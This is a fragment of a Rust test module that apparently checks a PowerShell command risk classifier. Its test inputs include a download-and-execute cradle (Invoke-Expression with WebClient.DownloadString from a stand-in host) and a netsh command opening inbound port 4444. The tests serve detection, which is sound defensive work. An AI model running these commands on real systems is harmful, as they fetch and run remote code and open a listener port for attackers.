...
mod tests {
    ...
    fn test_critical_iex_url() {
        ...
        assert_eq!(
            classify_ps_command(
                "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://x.com')"
            ),
            PsRiskLevel::Critical
        );
    }
    ...
    fn test_high_netsh_firewall() {
        assert_eq!(
            classify_ps_command(
                "netsh advfirewall firewall add rule name='Open 4444' dir=in protocol=tcp localport=4444 action=allow"
            ),
            PsRiskLevel::High
        );
    }
